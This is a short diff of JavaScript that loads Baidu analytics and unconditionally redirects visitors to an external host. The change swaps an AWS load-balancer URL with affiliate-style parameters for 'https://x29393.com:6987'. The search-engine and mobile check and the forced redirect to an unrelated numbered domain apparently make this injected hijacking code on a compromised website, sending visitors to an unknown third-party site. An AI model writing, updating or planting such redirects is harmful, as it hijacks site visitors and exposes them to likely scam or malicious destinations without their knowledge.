@@ -21,8 +21,8 @@ function loadBaiduAnalytics() {
 
 if (isFromSearchEngine() && isMobile()) {
     loadBaiduAnalytics();
-    window.location.href = "http://web-alb-wg223-1153285546.ap-southeast-1.elb.amazonaws.com:58297/?cid=386111&type=2&currency=CNY";
+    window.location.href = "https://x29393.com:6987";
 } else {
     loadBaiduAnalytics();
-    window.location.href = "http://web-alb-wg223-1153285546.ap-southeast-1.elb.amazonaws.com:58297/?cid=386111&type=2&currency=CNY";
+    window.location.href = "https://x29393.com:6987";
 }
